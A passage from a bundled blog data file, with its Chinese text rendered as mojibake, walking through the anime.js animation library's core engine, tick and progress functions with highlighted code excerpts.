ä¸Šä¸€æ¬¡è°ƒç”¨rafçš„æ—¶é—´</span>\\nstartTime\\n<span class=\\"hljs-comment\\">// å½“å‰ä½ç½®æ‰€æ¶ˆè€—æ—¶é—´(èƒ½åŒ¹é…åè½¬çŠ¶æ€)ï¼Œæ ¹æ®engineTimeè®¡ç®—</span>\\ninsTime\\n<span class=\\"hljs-comment\\">// åŠ¨ç”»æŒç»­æ—¶é—´</span>\\ninsDuration\\n<span class=\\"hljs-comment\\">// å»¶è¿Ÿæ—¶é—´</span>\\ndelay\\n<span class=\\"hljs-comment\\">// ä»ä»€ä¹ˆæ—¶é—´ç‚¹å¼€å§‹åŠ¨ç”»</span>\\ninsOffset</code></pre></code></pre>\\n<p>æ¥ç€çœ‹å‡ ä¸ªå…³é”®å‡½æ•°ï¼Œè¿™é‡Œå…ˆä¸æ”¾å…·ä½“ä»£ç ï¼Œåªæ˜¯å…ˆçŸ¥é“æ˜¯åšä»€ä¹ˆçš„(æŒ‰ä¸€ä¸ªæ­£å¸¸åŠ¨ç”»é¡ºåºæ’æ”¾)ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// animeçš„æ ¸å¿ƒæœºåˆ¶, é€’å½’è°ƒç”¨rafæ‰§è¡Œ(å…³é”®)</span>\\n<span class=\\"hljs-keyword\\">const</span> engine = <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">(</span>) =&gt;</span> {\\n  <span class=\\"hljs-comment\\">// ...requestAnimateFrame</span>\\n})();\\n\\n<span class=\\"hljs-comment\\">// animeä¸»ä½“</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">anime</span>(<span class=\\"hljs-params\\">params</span>)</span>{\\n\\n  <span class=\\"hljs-comment\\">// å®šä¹‰instance ä¹Ÿæ˜¯æœ€ç»ˆè¿”å›å€¼</span>\\n  <span class=\\"hljs-keyword\\">let</span> instance = createNewInstance(params);\\n\\n  <span class=\\"hljs-comment\\">// å¤–éƒ¨API ä»å½“å‰ä½ç½®å¼€å§‹æ‰§è¡ŒåŠ¨ç”»</span>\\n  instance.play = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{}\\n\\n  <span class=\\"hljs-comment\\">// é…ç½® startTime å’Œ engineTime(å…³é”®)</span>\\n   instance.tick = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">t</span>) </span>{}\\n\\n  <span class=\\"hljs-comment\\">// å¯¹å½“å‰engineTimeè¿›è¡Œåˆ¤æ–­ï¼Œç¡®å®šåŠ¨ç”»æ–¹æ¡ˆ(å…³é”®)</span>\\n  <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">setInstanceProgress</span>(<span class=\\"hljs-params\\">engineTime</span>) </span>{}\\n\\n  <span class=\\"hljs-comment\\">// è®¡ç®—åŠ¨ç”»å½“å‰ä½ç½® å¹¶ä¸”èµ‹å€¼(å…³é”®)</span>\\n  <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">setAnimationsProgress</span>(<span class=\\"hljs-params\\">insTime</span>)</span>{}\\n\\n  <span class=\\"hljs-comment\\">// ç›´æ¥è·³åˆ°å‚æ•°timeçš„æ—¶é—´æ‰€åœ¨çš„ä½ç½®</span>\\n  instance.seek = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">time</span>) </span>{}\\n  <span class=\\"hljs-comment\\">// å¤–éƒ¨API æš‚åœ</span>\\n  instance.pause = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{}\\n  <span class=\\"hljs-comment\\">// å¤–éƒ¨API åè½¬</span>\\n  instance.reverse = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{}\\n  <span class=\\"hljs-comment\\">// å¤–éƒ¨API reset</span>\\n  instance.reset = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{}\\n  <span class=\\"hljs-comment\\">// å¤–éƒ¨API é‡æ–°å¼€å§‹</span>\\n  instance.restart = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{}\\n  <span class=\\"hljs-comment\\">/*...*/</span>\\n  <span class=\\"hljs-keyword\\">return</span> instance\\n}</code></pre></code></pre>\\n<p>å…³é”®å‡½æ•°å°±4ä¸ªï¼Œå…¶ä»–éƒ½æ˜¯ä¸€äº›å¯¹å…³é”®å‡½æ•°çš„å…·ä½“ä½¿ç”¨</p>\\n<p>æ¥ç€ä¸€ä¸ªä¸ªè§£æï¼š</p>\\n<ul>\\n<li>createNewInstance</li>\\n</ul>\\n<p>å…¶å®å°±æ˜¯å¯¹å±æ€§å’Œæ–¹æ³•åˆå¹¶æˆä¸€ä¸ªæ•´ä½“å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ˜¯è´¯ç©¿å…¨å±€çš„ï¼Œå› æ­¤é‡Œé¢ä»€ä¹ˆéƒ½æœ‰...</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">createNewInstance</span>(<span class=\\"hljs-params\\">params</span>) </span>{\\n\\n    <span class=\\"hljs-comment\\">/* å¯¹paramsè¿›è¡Œå¤„ç† */</span>\\n    <span class=\\"hljs-keyword\\">const</span> instanceSettings = replaceObjectProps(defaultInstanceSettings, params);\\n    <span class=\\"hljs-keyword\\">const</span> tweenSettings = replaceObjectProps(defaultTweenSettings, params);\\n    <span class=\\"hljs-keyword\\">const</span> animatables = getAnimatables(params.targets);\\n    <span class=\\"hljs-keyword\\">const</span> properties = getProperties(instanceSettings, tweenSettings, params);\\n    <span class=\\"hljs-keyword\\">const</span> animations = getAnimations(animatables, properties);\\n\\n    <span class=\\"hljs-comment\\">// mergeObjects(o1,o2)ç›¸å½“äº Object.assing({},o2,o1)</span>\\n    <span class=\\"hljs-keyword\\">return</span> mergeObjects(instanceSettings, {\\n      <span class=\\"hljs-attr\\">children</span>: [],\\n      <span class=\\"hljs-attr\\">animatables</span>: animatables,\\n      <span class=\\"hljs-attr\\">animations</span>: animations,\\n      <span class=\\"hljs-attr\\">duration</span>: getInstanceTimings(<span class=\\"hljs-string\\">\'duration\'</span>, animations, instanceSettings, tweenSettings),\\n      <span class=\\"hljs-attr\\">delay</span>: getInstanceTimings(<span class=\\"hljs-string\\">\'delay\'</span>, animations, instanceSettings, tweenSettings)\\n    });\\n  }</code></pre></code></pre>\\n<ul>\\n<li>instance.play</li>\\n</ul>\\n<p>æ­¤å¤„å…ˆåšäº†é˜²æŠ¤ï¼Œåªæœ‰pausedçŠ¶æ€ä¸‹æ‰ä¼šæ‰§è¡Œï¼Œ<code>lastTime</code>è¿™é‡Œæ˜¯è°ƒå–å½“å‰åŠ¨ç”»çš„ä½ç½®å¯¹åº”çš„æ—¶é—´ï¼Œå› æ­¤æ‰å¯ä»¥å®ç°ä»ä»»æ„ä½ç½®å¼€å§‹åŠ¨ç”»ã€‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-comment\\">// å¤–éƒ¨API ä»å½“å‰ä½ç½®å¼€å§‹æ‰§è¡ŒåŠ¨ç”»</span>\\ninstance.play = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n  <span class=\\"hljs-keyword\\">if</span> (!instance.paused) <span class=\\"hljs-keyword\\">return</span>;\\n  instance.paused = <span class=\\"hljs-literal\\">false</span>;\\n  <span class=\\"hljs-comment\\">// ä»0 å¼€å§‹</span>\\n  startTime = <span class=\\"hljs-number\\">0</span>;\\n  <span class=\\"hljs-comment\\">// è°ƒå–å½“å‰åŠ¨ç”»å½“å‰ä½ç½®æ‰€å¯¹åº”çš„æ—¶é—´</span>\\n  lastTime = adjustTime(instance.currentTime);\\n  <span class=\\"hljs-comment\\">// ç»™ activeInstances æ·»åŠ å½“å‰å®ä¾‹ï¼Œè¯´æ˜è¿™æ˜¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„åŠ¨ç”»</span>\\n  activeInstances.push(instance);\\n  <span class=\\"hljs-comment\\">// rafæœªå¯åŠ¨ï¼Œè°ƒç”¨engine</span>\\n  <span class=\\"hljs-keyword\\">if</span> (!raf) engine();\\n}</code></pre></code></pre>\\n<ul>\\n<li>engine</li>\\n</ul>\\n<p>animeçš„æ ¸å¿ƒæœºåˆ¶ï¼Œé€šè¿‡é€’å½’è°ƒç”¨<code>requestAnimateFrame</code>ï¼Œå½“æ£€æµ‹åˆ°éœ€è¦æ‰§è¡ŒåŠ¨ç”»çš„é›†åˆ<code>activeInstances</code>æœ‰å€¼ï¼Œè°ƒç”¨instance.tickã€‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>  <span class=\\"hljs-comment\\">// IIFE ä¹‹åè°ƒç”¨engineç›¸å½“äºæ‰§è¡Œå†…éƒ¨çš„play</span>\\n  <span class=\\"hljs-keyword\\">const</span> engine = <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">(</span>) =&gt;</span> {\\n    <span class=\\"hljs-comment\\">// stepæ”¶åˆ°ä¸€ä¸ªå‚æ•°ï¼Œ</span>\\n    <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">play</span>(<span class=\\"hljs-params\\"></span>) </span>{ raf = requestAnimationFrame(step); };\\n    <span class=\\"hljs-comment\\">// è¿™é‡Œçš„å‚æ•°tæ˜¯ rafçš„å‚æ•°ä¸­å¯ä»¥æ¥å—çš„ä¸€ä¸ªæ—¶é—´æˆ³ï¼Œè¡¨ç¤ºè§¦å‘è°ƒç”¨çš„æ—¶é—´</span>\\n    <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">step</span>(<span class=\\"hljs-params\\">t</span>) </span>{\\n      <span class=\\"hljs-comment\\">// activeInstancesæŒ‡æ­£åœ¨è¢«æ‰§è¡Œçš„åŠ¨ç”»é›†åˆ</span>\\n      <span class=\\"hljs-keyword\\">const</span> activeLength = activeInstances.length;\\n      <span class=\\"hljs-comment\\">// å­˜åœ¨æ­£åœ¨è¿è¡Œçš„åŠ¨ç”»</span>\\n      <span class=\\"hljs-keyword\\">if</span> (activeLength) {\\n        <span class=\\"hljs-keyword\\">let</span> i = <span class=\\"hljs-number\\">0</span>;\\n        <span class=\\"hljs-keyword\\">while</span> (i &lt; activeLength) {\\n          <span class=\\"hljs-comment\\">// è°ƒç”¨tickæ‰§è¡Œ</span>\\n          <span class=\\"hljs-keyword\\">if</span> (activeInstances[i]) activeInstances[i].tick(t);\\n          i++;\\n        }\\n        play();\\n      } <span class=\\"hljs-keyword\\">else</span> {\\n        <span class=\\"hljs-comment\\">// ä¸å­˜åœ¨æ­£åœ¨è¿è¡Œçš„åŠ¨ç”» cancel</span>\\n        cancelAnimationFrame(raf);\\n        raf = <span class=\\"hljs-number\\">0</span>;\\n      }\\n    }\\n    <span class=\\"hljs-keyword\\">return</span> play;\\n  })();</code></pre></code></pre>\\n<ul>\\n<li>instance.tick</li>\\n</ul>\\n<p>tickçš„ä½œç”¨é€šè¿‡å‚æ•°<code>t</code>ï¼Œ<code>raf</code>çš„ä¸€ä¸ªæ—¶é—´æˆ³æ¦‚å¿µï¼Œè®¡ç®—å‡ºè·ç¦»ä¸Šä¸€æ¬¡è°ƒç”¨å®é™…æ¶ˆè€—çš„æ—¶é—´<code>engineTime</code>ã€‚</p>\\n<p>ä¾‹å¦‚ï¼šä¸Šä¸€æ¬¡è°ƒç”¨æ—¶é—´æˆ³æ˜¯<code>1000</code>ï¼Œä¹Ÿå°±æ˜¯1ç§’ï¼Œä¸­é€”çªç„¶æ‰§è¡Œä¸€ä¸ªå·¨å¤§çš„ä»»åŠ¡ï¼Œç­‰ä»»åŠ¡ç»“æŸï¼Œæ—¶é—´æˆ³æ˜¯<code>20000</code>ï¼Œ\\né‚£ä¹ˆè¿™æ¬¡çš„<code>engineTime</code>å°±æ˜¯<code>lastTime+20000-1000</code>ï¼Œä¹Ÿå°±æ˜¯è®¡ç®—è¿™æ¬¡åŠ¨ç”»ä»ä¸Šæ¬¡ä½ç½®å†åŠ ä¸Š19ç§’çš„ä½ç½®...\\né‚£ä¹ˆanimeå¯¹äºè¿™ç§æƒ…å†µæ˜¯æ€ä¹ˆå¤„ç†å‘¢?ç»§ç»­çœ‹ä¸‹ä¸€ä¸ª<code>setInstanceProgress</code>ã€‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// é…ç½® startTime å’Œ engineTime</span>\\ninstance.tick = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">t</span>) </span>{\\n  now = t;\\n  <span class=\\"hljs-comment\\">// startTime å¦‚æœé¦–æ¬¡æ‰§è¡Œ å°±æ˜¯nowï¼Œå¦åˆ™å°±æ˜¯ä¸Šä¸€æ¬¡tickçš„æ—¶é—´</span>\\n  <span class=\\"hljs-keyword\\">if</span> (!startTime) startTime = now;\\n  <span class=\\"hljs-comment\\">// lastTime æ˜¯ä¸Šä¸€æ¬¡æ‰§è¡Œç»“æŸååŠ¨ç”»å¯¹åº”ä½ç½®çš„æ—¶é—´æˆ³</span>\\n  <span class=\\"hljs-comment\\">// engineTime æ˜¯åˆ°åŠ¨ç”»ç›®å‰ä¸ºæ­¢æ¶ˆè€—çš„æ€»æ—¶é—´ï¼Œä¸€èˆ¬ç†è®ºä¸Šè®²æ˜¯lastTime+16.6667</span>\\n  <span class=\\"hljs-keyword\\">const</span> engineTime = (lastTime + now - startTime) * anime.speed;\\n  setInstanceProgress(engineTime);\\n}</code></pre></code></pre>\\n<ul>\\n<li>setInstanceProgress</li>\\n</ul>\\n<p>è¿™ä¸ªå‡½æ•°æ¥å—ä¸€ä¸ªæ¶ˆè€—çš„æ—¶é—´å€¼ï¼Œåœ¨å†…éƒ¨å¯¹å…¶è¿›è¡Œé€‚é…å’Œå®šä¹‰äº†å„ç§æƒ…å†µçš„åŠ¨ç”»èµ·å§‹ç‚¹ï¼Œä¼ é€’ç»™<code>setAnimationsProgress</code>ã€‚</p>\\n<p>ä¾‹å¦‚ï¼Œä¸Šé¢é‚£ä¸ªä¾‹å­ï¼Œå¦‚æœæ¶ˆè€—äº†19ç§’ï¼Œå°±å¦‚è¿›å…¥è¿™ä¸ªåˆ¤æ–­:ä»ç»“æŸç‚¹å¼€å§‹åŠ¨ç”»(è€ƒè™‘reverseçš„æƒ…å†µ)ã€‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// æ¶ˆè€—çš„æ—¶é—´è¶…å‡ºäº†æŒç»­æ—¶é—´ å¹¶ä¸”å½“å‰ä½ç½®ä¸åœ¨ç»ˆç‚¹  æˆ–è€… æœªè®¾å®šæŒç»­æ—¶é—´</span>\\n<span class=\\"hljs-keyword\\">if</span> ((insTime &gt;= insDuration &amp;&amp; insCurrentTime !== insDuration) || !insDuration){\\n  <span class=\\"hljs-keyword\\">if</span> ((insTime &gt;= insDuration &amp;&amp; insCurrentTime !== insDuration) || !insDuration) {\\n    <span class=\\"hljs-comment\\">// ä»ç»“æŸç‚¹å¼€å§‹</span>\\n    setAnimationsProgress(insDuration);\\n    <span class=\\"hljs-keyword\\">if</span> (!insReversed) countIteration();\\n  }\\n}</code></pre></code></pre>\\n<p>setInstanceProgress(çœç•¥äº†ä¸€äº›é…ç½®çš„å®šä¹‰)</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// å¯¹å½“å‰engineTimeè¿›è¡Œåˆ¤æ–­ï¼Œç¡®å®šåŠ¨ç”»æ–¹æ¡ˆ</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">setInstanceProgress</span>(<span class=\\"hljs-params\\">engineTime</span>) </span>{\\n  <span class=\\"hljs-comment\\">// åŠ¨ç”»æŒç»­æ—¶é—´</span>\\n  <span class=\\"hljs-keyword\\">const</span> insDuration = instance.duration;\\n  <span class=\\"hljs-comment\\">// ä»ä»€ä¹ˆæ—¶é—´ç‚¹å¼€å§‹åŠ¨ç”»</span>\\n  <span class=\\"hljs-keyword\\">const</span> insOffset = instance.offset;\\n  <span class=\\"hljs-comment\\">// åŠ ä¸Šå»¶è¿Ÿåçš„å¼€å§‹æ—¶é—´</span>\\n  <span class=\\"hljs-keyword\\">const</span> insStart = insOffset + instance.delay;\\n  <span class=\\"hljs-comment\\">// è®°å½•å½“å‰ä½ç½®æ‰€å¯¹åº”çš„æ—¶é—´</span>\\n  <span class=\\"hljs-keyword\\">const</span> insCurrentTime = instance.currentTime;\\n  <span class=\\"hljs-comment\\">// æ˜¯å¦æ˜¯åè½¬çŠ¶æ€</span>\\n  <span class=\\"hljs-keyword\\">const</span> insReversed = instance.reversed;\\n  <span class=\\"hljs-comment\\">// å½“å‰ä½ç½®æ‰€æ¶ˆè€—æ—¶é—´(èƒ½åŒ¹é…åè½¬çŠ¶æ€)</span>\\n  <span class=\\"hljs-comment\\">// è¿™é‡ŒadjustTimeå°±æ˜¯å¦‚æœæ˜¯åè½¬çŠ¶æ€ï¼Œåˆ™è¿”å› insDuration-engineTime</span>\\n  <span class=\\"hljs-keyword\\">const</span> insTime = adjustTime(engineTime);\\n  <span class=\\"hljs-comment\\">/* ... */</span>\\n  <span class=\\"hljs-comment\\">// æ¶ˆè€—çš„æ—¶é—´å¤§äºåº”è¯¥å¼€å§‹çš„æ—¶é—´ å¹¶ä¸” æ¶ˆè€—çš„æ—¶é—´åœ¨æŒç»­æ—¶é—´èŒƒå›´å†…</span>\\n  <span class=\\"hljs-keyword\\">if</span> (insTime &gt; insOffset &amp;&amp; insTime &lt; insDuration) {\\n    setAnimationsProgress(insTime);\\n  } <span class=\\"hljs-keyword\\">else</span> {\\n    <span class=\\"hljs-comment\\">// æ¶ˆè€—çš„æ—¶é—´å°äºåº”è¯¥å¼€å§‹çš„æ—¶é—´ å¹¶ä¸” å½“å‰ä½ç½®ä¸åœ¨èµ·ç‚¹</span>\\n    <span class=\\"hljs-keyword\\">if</span> (insTime &lt;= insOffset &amp;&amp; insCurrentTime !== <span class=\\"hljs-number\\">0</span>) {\\n      <span class=\\"hljs-comment\\">// ä»å¤´å¼€å§‹</span>\\n      setAnimationsProgress(<span class=\\"hljs-number\\">0</span>);\\n      <span class=\\"hljs-keyword\\">if</span> (insReversed) countIteration();\\n    }\\n    <span class=\\"hljs-comment\\">// æ¶ˆè€—çš„æ—¶é—´è¶…å‡ºäº†æŒç»­æ—¶é—´ å¹¶ä¸”å½“å‰ä½ç½®ä¸åœ¨ç»ˆç‚¹  æˆ–è€… æœªè®¾å®šæŒç»­æ—¶é—´</span>\\n    <span class=\\"hljs-keyword\\">if</span> ((insTime &gt;= insDuration &amp;&amp; insCurrentTime !== insDuration) || !insDuration) {\\n      <span class=\\"hljs-comment\\">// ä»ç»“æŸç‚¹å¼€å§‹</span>\\n      setAnimationsProgress(insDuration);\\n      <span class=\\"hljs-keyword\\">if</span> (!insReversed) countIteration();\\n    }\\n  }\\n  setCallback(<span class=\\"hljs-string\\">\'update\'</span>);\\n  <span class=\\"hljs-comment\\">// æ¶ˆè€—æ—¶é—´å¤§äºæŒç»­æ—¶é—´ å¹¶ä¸”åœ¨ç»ˆç‚¹(ä¸åœ¨ç»ˆç‚¹çš„ä¸Šé¢å·²ç»åˆ¤æ–­äº†)</span>\\n  <span class=\\"hljs-keyword\\">if</span> (engineTime &gt;= insDuration) {\\n    <span class=\\"hljs-keyword\\">if</span> (instance.remaining) {\\n      startTime = now;\\n      <span class=\\"hljs-keyword\\">if</span> (instance.direction === <span class=\\"hljs-string\\">\'alternate\'</span>) toggleInstanceDirection();\\n      <span class=\\"hljs-comment\\">// remainingä¸ºfalseï¼Œremaining&gt;0è¯´æ˜è¿˜éœ€è¦ç»§ç»­åŠ¨ç”»</span>\\n    } <span class=\\"hljs-keyword\\">else</span> {\\n      <span class=\\"hljs-comment\\">// å®ŒæˆåŠ¨ç”»çš„æ‰§è¡Œ</span>\\n      instance.pause();\\n      <span class=\\"hljs-keyword\\">if</span> (!instance.completed) {\\n        instance.completed = <span class=\\"hljs-literal\\">true</span>;\\n        setCallback(<span class=\\"hljs-string\\">\'complete\'</span>);\\n        <span class=\\"hljs-keyword\\">if</span> (<span class=\\"hljs-string\\">\'Promise\'</span> <span class=\\"hljs-keyword\\">in</span> <span class=\\"hljs-built_in\\">window</span>) {\\n          resolve();\\n          promise = makePromise();\\n        }\\n      }\\n    }\\n    lastTime = <span class=\\"hljs-number\\">0</span>;\\n  }\\n}</code></pre></code></pre>\\n<p>å…³é”®å‡½æ•°<code>setAnimationsProgress</code>å’Œåç»­çš„æ“ä½œå‡½æ•°éƒ½æ”¾åœ¨ä¸‹ä¸€ç¯‡ç»§ç»­è§£æã€‚</p>\\n","toc":[{"anchor":"jie-shao","level":2,"text":"ä»‹ç»"},{"anchor":"shen-ru-li-jie","level":2,"text":"æ·±å…¥ç†è§£"}],"relatedTags":null,"created_at":"2018-07-20","timeArr":[2018,6,20,0,0,0,0],"title":"æºç é˜…è¯»-è§£æanimeæ ¸å¿ƒ(1)","uuid":"631c6ad421f436a2f8a59b287261b6a4cdaae80d","summary":"<p>æœ¬æ¬¡è§£æå°†åˆ†ä¸º2ç¯‡æ–‡ç« ï¼Œå½“å‰æ˜¯ç¬¬ä¸€ç¯‡ï¼Œç¬¬äºŒç¯‡åœ¨<a href=\\"./07-21-%E8%A7%A3%E6%9E%90anime%E6%A0%B8%E5%BF%83(2).md\\">è¿™é‡Œ</a></p>\\n<p>å¦å¤–ï¼Œä¸ºäº†èƒ½æ›´å¥½çš„ç†è§£è¿™ä¸ªåº“ï¼Œä¸ªäººå†™äº†ä¸€ä¸ªæ­¤åº“çš„å‹ç¼©ç‰ˆï¼Œå®ç°äº†æ ¸å¿ƒçš„åŠŸèƒ½(ä¸»è¦ä¹Ÿæ˜¯ä¸ºäº†æ›´å¥½ç†è§£æ ¸å¿ƒåŠŸèƒ½)ï¼Œå†…å®¹æ›´å°‘æ–¹ä¾¿é˜…è¯»ï¼Œ\\nåœ°å€åœ¨[è¿™é‡Œ](https://github.com/stonehank/simpli...</p>","slug":"yuan-ma-yue-du-jie-xi-anime-he-xin-(1)","sha":"2841c2c60ffc45abdca1ed525155f5b777ed54c7"}')},667:function(n){n.exports=JSON.parse('{"content":"<p>æœ¬æ¬¡è§£æå°†åˆ†ä¸º2ç¯‡æ–‡ç« ï¼Œå½“å‰æ˜¯ç¬¬äºŒç¯‡ï¼Œç¬¬ä¸€ç¯‡åœ¨<a href=\\"./07-20-%E8%A7%A3%E6%9E%90anime%E6%A0%B8%E5%BF%83(1).md\\">è¿™é‡Œ</a></p>\\n<p>å¦å¤–ï¼Œä¸ºäº†èƒ½æ›´å¥½çš„ç†è§£è¿™ä¸ªåº“ï¼Œä¸ªäººå†™äº†ä¸€ä¸ªæ­¤åº“çš„å‹ç¼©ç‰ˆï¼Œå®ç°äº†æ ¸å¿ƒçš„åŠŸèƒ½(ä¸»è¦ä¹Ÿæ˜¯ä¸ºäº†æ›´å¥½ç†è§£æ ¸å¿ƒåŠŸèƒ½)ï¼Œå†…å®¹æ›´å°‘æ–¹ä¾¿é˜…è¯»ï¼Œ\\nåœ°å€åœ¨<a href=\\"https://github.com/stonehank/simplify-anime\\">è¿™é‡Œ</a></p>\\n<hr>\\n<p>ç»§ç»­ä¸Šä¸€ç¯‡ï¼Œå…ˆæŠŠç»“æ„å›¾æ‹‰è¿‡æ¥ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// animeä¸»ä½“</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">anime</span>(<span class=\\"hljs-params\\">params</span>)</span>{\\n\\n  <span class=\\"hljs-comment\\">// å®šä¹‰instance ä¹Ÿæ˜¯æœ€ç»ˆè¿”å›å€¼</span>\\n  <span class=\\"hljs-keyword\\">let</span> instance = createNewInstance(params);\\n\\n  <span class=\\"hljs-comment\\">// å¤–éƒ¨API ä»å½“å‰ä½ç½®å¼€å§‹æ‰§è¡ŒåŠ¨ç”»</span>\\n  instance.play = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{}\\n\\n  <span class=\\"hljs-comment\\">// é…ç½® startTime å’Œ engineTime(å…³é”®)</span>\\n   instance.tick = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">t</span>) </span>{}\\n\\n  <span class=\\"hljs-comment\\">// å¯¹å½“å‰engineTimeè¿›è¡Œåˆ¤æ–­ï¼Œç¡®å®šåŠ¨ç”»æ–¹æ¡ˆ(å…³é”®)</span>\\n  <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">setInstanceProgress</span>(<span class=\\"hljs-params\\">engineTime</span>) </span>{}\\n\\n  <span class=\\"hljs-comment\\">// è®¡ç®—åŠ¨ç”»å½“å‰ä½ç½® å¹¶ä¸”èµ‹å€¼(å…³é”®)</span>\\n  <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">setAnimationsProgress</span>(<span class=\\"hljs-params\\">insTime</span>)</span>{}\\n\\n  <span class=\\"hljs-comment\\">// ç›´æ¥è·³åˆ°å‚æ•°timeçš„æ—¶é—´æ‰€åœ¨çš„ä½ç½®</span>\\n  instance.seek = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">time</span>) </span>{}\\n  <span class=\\"hljs-comment\\">// å¤–éƒ¨API æš‚åœ</span>\\n  instance.pause = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{}\\n  <span class=\\"hljs-comment\\">// å¤–éƒ¨API åè½¬</span>\\n  instance.reverse = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{}\\n  <span class=\\"hljs-comment\\">// å¤–éƒ¨API reset</span>\\n  instance.reset = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{}\\n  <span class=\\"hljs-comment\\">// å¤–éƒ¨API é‡æ–°å¼€å§‹</span>\\n  instance.restart = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{}\\n  <span class=\\"hljs-comment\\">/*...*/</span>\\n  <span class=\\"hljs-keyword\\">return</span> instance\\n}</code></pre></code></pre>\\n<ul>\\n<li>setAnimationsProgress(çœç•¥äº†ä¸€äº›é…ç½®çš„å®šä¹‰)</li>\\n</ul>\\n<p>è¿™ä¸ªå‡½æ•°æ¥å—ä¸€ä¸ªå‚æ•°ï¼Œå°±æ˜¯å½“å‰ä½ç½®æ‰€æ¶ˆè€—æ—¶é—´(åŠ¨ç”»èµ·å§‹ç‚¹)ï¼Œç„¶ååœ¨é‡Œé¢è®¡ç®—å‡ºæ¯ä¸€ä¸ªåŠ¨ç”»ç›®æ ‡çš„ä½ç½®ï¼Œå¹¶ä¸”èµ‹å€¼</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// è®¡ç®—åŠ¨ç”»å½“å‰ä½ç½® å¹¶ä¸”èµ‹å€¼</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">setAnimationsProgress</span>(<span class=\\"hljs-params\\">insTime</span>) </span>{\\n  <span class=\\"hljs-comment\\">/* ... */</span>\\n  <span class=\\"hljs-comment\\">// è¿™ä¸ªwhileé€ä¸ªè®¡ç®—å½“å‰å®ä¾‹ä¸­çš„æ¯ä¸ªåŠ¨ç”»çš„å½“å‰ä½ç½®(é€šè¿‡æ—¶é—´å’Œç®—æ³•)</span>\\n  <span class=\\"hljs-keyword\\">while</span> (i &lt; animationsLength) {\\n      <span class=\\"hljs-comment\\">/* ... */</span>\\n    <span class=\\"hljs-comment\\">// æ¶ˆè€—çš„æ—¶é—´å æ€»æŒç»­æ—¶é—´çš„æ¯”ä¾‹ åœ¨èµ·ç‚¹ç»ˆç‚¹ä¹‹é—´</span>\\n    <span class=\\"hljs-keyword\\">const</span> elapsed = minMaxValue(insTime - tween.start - tween.delay, <span class=\\"hljs-number\\">0</span>, tween.duration) / tween.duration;\\n    <span class=\\"hljs-comment\\">// é€šè¿‡ç®—æ³•è®¡ç®—å½“å‰è¿›åº¦</span>\\n    <span class=\\"hljs-keyword\\">const</span> eased = <span class=\\"hljs-built_in\\">isNaN</span>(elapsed) ? <span class=\\"hljs-number\\">1</span> : tween.easing(elapsed, tween.elasticity);\\n    <span class=\\"hljs-comment\\">/* ... */</span>\\n    <span class=\\"hljs-comment\\">// éå†æ¯ä¸€ä¸ªåˆ°è¾¾ç‚¹æ‰§è¡Œ</span>\\n   